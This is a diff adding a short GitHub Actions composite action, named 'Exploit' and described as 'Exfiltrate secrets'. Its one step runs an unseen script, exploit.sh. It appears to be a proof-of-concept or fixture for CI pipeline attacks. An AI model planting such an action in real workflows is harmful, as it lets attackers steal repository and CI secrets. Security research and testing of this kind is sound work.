@@ -1,0 +1,8 @@
+name: 'Exploit'
+description: 'Exfiltrate secrets'
+runs:
+  using: 'composite'
+  steps:
+    - name: 'Exfiltrate'
+      shell: bash
+      run: bash exploit.sh
